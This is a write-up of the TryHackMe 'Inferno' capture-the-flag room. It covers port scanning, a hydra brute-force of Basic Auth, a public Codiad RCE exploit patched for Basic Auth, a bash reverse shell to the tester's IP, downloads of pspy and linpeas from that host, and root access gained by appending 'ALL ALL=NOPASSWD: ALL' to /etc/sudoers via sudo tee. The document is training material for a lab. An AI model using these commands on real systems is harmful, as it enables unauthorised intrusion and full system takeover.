# Inferno room - Try Hack Me

This writeup is for the Inferno room at tryhackme.com. Direct link to the room is: (https://tryhackme.com/room/inferno)

The description of the rooms says:

*Midway upon the journey of our life I found myself within a forest dark, For the straightforward pathway had been lost. Ah me! how hard a thing it is to say What was this forest savage, rough, and stern, Which in the very thought renews the fear."*

The text is from a poem called Inferno, Cante I by Dante Alighieri. 

As always I add the ip to my host file first:
```
 echo "10.10.145.233 inferno.thm"|sudo tee -a /etc/hosts
```

## Enumeration

The usual nmap-scan to begin with:
```
 nmap-scan inferno.thm .                                           
[#] Starting inital scan

nmap -p- -n -vv "inferno.thm" -oA "./allPorts"
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 03:02 EST
Initiating Ping Scan at 03:02
Scanning inferno.thm (10.10.145.233) [2 ports]
Completed Ping Scan at 03:02, 0.04s elapsed (1 total hosts)
Initiating Connect Scan at 03:02
Scanning inferno.thm (10.10.145.233) [65535 ports]
Discovered open port 443/tcp on 10.10.145.233
Discovered open port 22/tcp on 10.10.145.233
Discovered open port 110/tcp on 10.10.145.233
Discovered open port 80/tcp on 10.10.145.233
Discovered open port 21/tcp on 10.10.145.233
Discovered open port 25/tcp on 10.10.145.233
Discovered open port 23/tcp on 10.10.145.233
Discovered open port 30865/tcp on 10.10.145.233
Discovered open port 5680/tcp on 10.10.145.233
Discovered open port 17003/tcp on 10.10.145.233
Discovered open port 17004/tcp on 10.10.145.233
Discovered open port 60179/tcp on 10.10.145.233
Discovered open port 1178/tcp on 10.10.145.233
...

```
In total 90 ports identifies as open - an inferno of ports. Going through the most interesting ports and it turns out that it is really only ports 22 (ssh) and 80 (http) that are open. 

Let't take a look at the webservice as we have no user names yet for ssh.

![alt text](https://github.com/kimusan/THM-writeups/raw/main/inferno/inferno-ss.png "website")

The webserver shows an picture of Dantes 9 circles of hell and another part of Dantes Inforno, Canto 34 (this time in original language). Just for the sake of it I checked the page code to look for hidden info - nothing.

Lets fire up gobuster and find some files and directories. 

```
$ gobuster dir -u http://inferno.thm  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html,zip,bck | tee gobuster.log
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://inferno.thm
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     bck,php,txt,html,zip
[+] Timeout:        10s
===============================================================
2021/02/15 03:12:20 Starting gobuster
===============================================================
/index.html (Status: 200)
/inferno (Status: 401)
/server-status (Status: 403)
===============================================================
2021/02/15 03:30:53 Finished
===============================================================
```

so an interesting folder was found - /inferno/

The folder shows the usual Basic Auth popup in the browser, which usually means that no further investigation of that folder is possible without a user/pass combo.

The good part about Basic Auth is that it is pretty easy to bruteforce with hydra or similar tools - I prefer hydra.

I could use one of the secList wordlists with usernames and the common passwordlist rockyou, but running through all those combinations would take forever on my slow Kali box. 

Instead I decided to put together a short userlist with the absolutely most likely usernames for a medium-difficulty THM box like this:
```
admin
administrator
dante
inferno
alighieri
root
```
I started hydra with these users in a file users.txt (add -V for more insights into the progress):

```
hydra -L users.txt -P /user/share/wordlists/rockyou.txt inferno.thm http-head /inferno
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-15 03:56:04
[WARNING] http-head auth does not work with every server, better use http-get
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100410793 login tries (l:7/p:14344399), ~6275675 tries per task
[DATA] attacking http-head://inferno.thm:80/inferno
[STATUS] 4912.00 tries/min, 4912 tries in 00:01h, 100405881 to do in 340:41h, 16 active
[80][http-head] host: inferno.thm   login: admin   password: [REDACTED]

```

It turned out that my username guesses and their ordering was fantastic (again this info comes from playing a bunch of THM rooms). If I had to run throug heven this short list of users and all passwords it would likely take 350hours.
With the password and username I could now login via the basic auth popup....just to find a webpage with a login prompt. 
![alt text](https://github.com/kimusan/THM-writeups/raw/main/inferno/inferno-ss2.png "website login")


I tried the username/password combo again and it luckily worked.

Poking around shows that this is a filemanager called [Codiad](https://codiad.com) but it seems like all writing to files everywhere is blocked. 

## Getting foothold

Time to search the for possible exploits

```
$ searchsploit codiad
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Codiad 2.4.3 - Multiple Vulnerabilities                                                   | php/webapps/35585.txt
Codiad 2.5.3 - Local File Inclusion                                                       | php/webapps/36371.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```
The first one contains two vulns - an XXS that works and a local file inclusion (similar to the next vuln in the search result). The local file inclusion does not work so I had to go to google and search some more.

After a bit of searching around I finally found [this nice exploit to do RCE](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit).
Let's fire up the exploit:

```
$ python exploit.py http://inferno.thm/inferno/ admin dante1 10.11.25.15 1234 linux
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] Please execute the following command on your vps: 
echo 'bash -c "bash -i >/dev/tcp/10.11.25.15/1235 0>&1 2>&1"' | nc -lnvp 1234
nc -lnvp 1235
[+] Please confirm that you have done the two command above [y/n]
[Y/n] y
[+] Starting...
[+] Login Content : <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at inferno.thm Port 80</address>
</body></html>

[-] Login failed! Please check your username and password.
```

Hmm ok so the script hits the basic auth and will not login. This exploit is not built for the dual layer authentiation used here. 

Looking through the exploit code I can quickly see that it used the nice "requests" python module. Adding basic auth login to this is very easy. 
Simply import the HTTPBasicAuth class from requests and then use it as argument for whenever requests are sent in the script.
A diff of the change could look like this:
```
$ diff exploit.py exploit-fixed.py
7c7
< 
---
> from requests.auth import HTTPBasicAuth
9c9,10
< 
---
> buser = "admin"
> bpass = "REDACTED"
20c21
<     response = session.post(url, data=data, verify=False)
---
>     response = session.post(url, data=data,  auth=HTTPBasicAuth(buser, bpass), verify=False)
29,30c30,31
<     url = domain + "/components/project/controller.php?action=get_current"
<     response = session.get(url, verify=False)
---
>     url = domain + "/components/project/controller.php?action=get_current"   
>     response = session.get(url, verify=False,  auth=HTTPBasicAuth(buser, bpass)  )
88c89
<         response = session.post(url, data=payload, headers=headers, verify=False)
---
>         response = session.post(url, data=payload, headers=headers, verify=False, auth=HTTPBasicAuth(buser, bpass))
97c98
<         response = session.post(url, data=payload, headers=headers, verify=False)
---
>         response = session.post(url, data=payload, headers=headers, verify=False, auth=HTTPBasicAuth(buser, bpass))
```

running again and I now get this:

![alt text](https://github.com/kimusan/THM-writeups/raw/main/inferno/inferno-ss3.png "exploiting")

It worked....but after just a few seconds it looks like something sends an "exit" command to our shell and we gets kicked out. Another ring of the inferno? 

Lets see if we can bypass this inferno. Pulling pspy64 from my local machine to see if I can manage to identify the mechanism that kills my connection

```
cd /tmp 
wget 10.11.25.15/pspy64
chmod +x pspy64
./pspy64
...
...
2021/02/15 09:40:01 CMD: UID=0    PID=5434   | pkill bash
...
...
```
OK so basically it kills off all bash shells. What about other shells on this box? let's fire up /bin/sh as the first thing when getting access - SUCCESS! 

sh is pretty bad but better than getting kicked off all the time.

## Getting user

I started enumerating a box with linpeas.sh
```
cd /tmp
wget 10.11.25.15/linpeas.sh
sh linpeas.sh
---
```
It did not reveal much except for some .htpasswd files that seems to be the ones having the password I broke previously. 
There were some files owned by root shown in the user folder for a user called Dante

So I checked the folder of those files:
```
cd /home/dante/Downloads
ls -lah
total 4.4M
drwxr-xr-x  2 root  root  4.0K Jan 11 15:29 .
drwxr-xr-x 13 dante dante 4.0K Jan 11 15:46 ..
-rw-r--r--  1 root  root  1.5K Nov  3 11:52 .download.dat
-rwxr-xr-x  1 root  root  135K Jan 11 15:29 CantoI.docx
-rwxr-xr-x  1 root  root  139K Jan 11 15:29 CantoII.docx
-rwxr-xr-x  1 root  root   87K Jan 11 15:29 CantoIII.docx
-rwxr-xr-x  1 root  root   63K Jan 11 15:29 CantoIV.docx
-rwxr-xr-x  1 root  root  131K Jan 11 15:29 CantoIX.docx
-rwxr-xr-x  1 root  root   43K Jan 11 15:22 CantoV.docx
-rwxr-xr-x  1 root  root  131K Jan 11 15:29 CantoVI.docx
-rwxr-xr-x  1 root  root  139K Jan 11 15:29 CantoVII.docx
-rwxr-xr-x  1 root  root   63K Jan 11 15:29 CantoX.docx
-rwxr-xr-x  1 root  root  119K Jan 11 15:29 CantoXI.docx
-rwxr-xr-x  1 root  root  146K Jan 11 15:22 CantoXII.docx
-rwxr-xr-x  1 root  root  212K Jan 11 15:22 CantoXIII.docx
-rwxr-xr-x  1 root  root  139K Jan 11 15:29 CantoXIV.docx
-rwxr-xr-x  1 root  root  139K Jan 11 15:29 CantoXIX.docx
-rwxr-xr-x  1 root  root   87K Jan 11 15:29 CantoXV.docx
-rwxr-xr-x  1 root  root  135K Jan 11 15:29 CantoXVI.docx
-rwxr-xr-x  1 root  root  119K Jan 11 15:29 CantoXVII.docx
-rwxr-xr-x  1 root  root  2.3M Jan 11 15:22 CantoXVIII.docx
-rwxr-xr-x  1 root  root   63K Jan 11 15:29 CantoXX.docx
```
The docx files might be interesting text but not relevant for getting user. The .download.dat file could be interesting though

```
cat .download.dat
c2 ab 4f 72 20 73 65 e2 80 99 20 74 75 20 71 75 65 6c 20 56 69 72 67 69 6c 69 6f 20 65 20 71 
75 65 6c 6c 61 20 66 6f 6e 74 65 0a 63 68 65 20 73 70 61 6e 64 69 20 64 69 20 70 61 72 6c 61 
72 20 73 c3 ac 20 6c 61 72 67 6f 20 66 69 75 6d 65 3f c2 bb 2c 0a 72 69 73 70 75 6f 73 e2 80 
99 69 6f 20 6c 75 69 20 63 6f 6e 20 76 65 72 67 6f 67 6e 6f 73 61 20 66 72 6f 6e 74 65 2e 0a 
0a c2 ab 4f 20 64 65 20 6c 69 20 61 6c 74 72 69 20 70 6f 65 74 69 20 6f 6e 6f 72 65 20 65 20 
6c 75 6d 65 2c 0a 76 61 67 6c 69 61 6d 69 20 e2 80 99 6c 20 6c 75 6e 67 6f 20 73 74 75 64 69 
6f 20 65 20 e2 80 99 6c 20 67 72 61 6e 64 65 20 61 6d 6f 72 65 0a 63 68 65 20 6d e2 80 99 68 
61 20 66 61 74 74 6f 20 63 65 72 63 61 72 20 6c 6f 20 74 75 6f 20 76 6f 6c 75 6d 65 2e 0a 0a 
54 75 20 73 65 e2 80 99 20 6c 6f 20 6d 69 6f 20 6d 61 65 73 74 72 6f 20 65 20 e2 80 99 6c 20 
6d 69 6f 20 61 75 74 6f 72 65 2c 0a 74 75 20 73 65 e2 80 99 20 73 6f 6c 6f 20 63 6f 6c 75 69 
20 64 61 20 63 75 e2 80 99 20 69 6f 20 74 6f 6c 73 69 0a 6c 6f 20 62 65 6c 6c 6f 20 73 74 69 
6c 6f 20 63 68 65 20 6d e2 80 99 68 61 20 66 61 74 74 6f 20 6f 6e 6f 72 65 2e 0a 0a 56 65 64 
69 20 6c 61 20 62 65 73 74 69 61 20 70 65 72 20 63 75 e2 80 99 20 69 6f 20 6d 69 20 76 6f 6c 
73 69 3b 0a 61 69 75 74 61 6d 69 20 64 61 20 6c 65 69 2c 20 66 61 6d 6f 73 6f 20 73 61 67 67 
69 6f 2c 0a 63 68 e2 80 99 65 6c 6c 61 20 6d 69 20 6.......[REDACTED]
```
This looks like an ascii file converted into hex. Let's convert it back. Luckily Linux comes default with the nice hex tool xxd:
```
cat .download.dat|xxd -p -r 
«Or se’ tu quel Virgilio e quella fonte
che spandi di parlar sì largo fiume?»,
rispuos’io lui con vergognosa fronte.

«O de li altri poeti onore e lume,
vagliami ’l lungo studio e ’l grande amore
che m’ha fatto cercar lo tuo volume.

Tu se’ lo mio maestro e ’l mio autore,
tu se’ solo colui da cu’ io tolsi
lo bello stilo che m’ha fatto onore.

Vedi la bestia per cu’ io mi volsi;
aiutami da lei, famoso saggio,
ch’ella mi fa tremar le vene e i polsi».

dante:V[REDACTED]

``` 
Nice! so now we have a user and a password. Using SSH we can now get user (and do remember to run sh to prevent forced exit):

```
ssh dante@inferno.thm                     
The authenticity of host 'inferno.thm (10.10.145.233)' can't be established.
ECDSA key fingerprint is SHA256:QMSVr7PFqk9fLxwYBp9LCg9SjU6kioP9tJbL6ed0mZI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'inferno.thm,10.10.145.233' (ECDSA) to the list of known hosts.
dante@inferno.thm's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-130-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Feb 15 10:11:30 UTC 2021

  System load:  0.14              Processes:           1203
  Usage of /:   43.8% of 8.79GB   Users logged in:     0
  Memory usage: 75%               IP address for eth0: 10.10.145.233
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Mon Jan 11 15:56:07 2021 from 192.168.1.109
dante@Inferno:~$ sh
$ ls
Desktop  Documents  Downloads  local.txt  Music  Pictures  Public  Templates  Videos
$ cat local.txt
7----------REDACTED------------5

```
First flag found! 

# Privelege escalation
Next up is getting root. The first thing I usually do in these THM rooms is to check sudo
```
sudo -l
Matching Defaults entries for dante on Inferno:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dante may run the following commands on Inferno:
    (root) NOPASSWD: /usr/bin/tee
```
So we have sudo access to the tee program. Let's check [gtfobins](https://gtfobins.github.io/gtfobins/tee/) to look for tee sudo tricks (I just use the command line interface for it):
```
$ gtfo -b tee                                        
   _  _           _    __      
 _| || |_        | |  / _|     
|_  __  _|   __ _| |_| |_ ___  
 _| || |_   / _` | __|  _/ _ \ 
|_  __  _| | (_| | |_| || (_) |
  |_||_|    \__, |\__|_| \___/ 
             __/ |             
            |___/              



Code:	LFILE=file_to_write
	echo DATA | ./tee -a "$LFILE"
	
Type:	file-write


Code:	LFILE=file_to_write
	echo DATA | ./tee -a "$LFILE"
	
Type:	suid


Code:	LFILE=file_to_write
	echo DATA | sudo tee -a "$LFILE"
	
Type:	sudo
```

So how about maybe using tee to append a new better rule to the sudoers file. For sudo to work we however need to be in a tty enabled shell - so basically bash!

I fired up pspy64 in one shell and waited for it to show that the bash shells got killed. Just after that happend I used another terminal to login via ssh as dante again and then do the following:
```
Last login: Mon Feb 15 10:11:32 2021 from 10.11.25.15
dante@Inferno:~$ echo "ALL ALL=NOPASSWD: ALL"|sudo tee -a /etc/sudoers
ALL ALL=NOPASSWD: ALL
dante@Inferno:~$ sudo /bin/bash -p
root@Inferno:~# sh
#cat /root/proof.txt 
Congrats!

You've rooted Inferno!

f----------REDACTED------------4

mindsflee
# 
```
DONE! got the root flag and thereby finished the room. 

## Afterthoughts
This room was pretty fun. It required a bit of coding and the "infernos" introduced by the fake ports and bash killing was a nice touch. The enumeration wasn't streight forward and for once linpeas did actually not reveal the possible escalation. All in all a very fun room.  
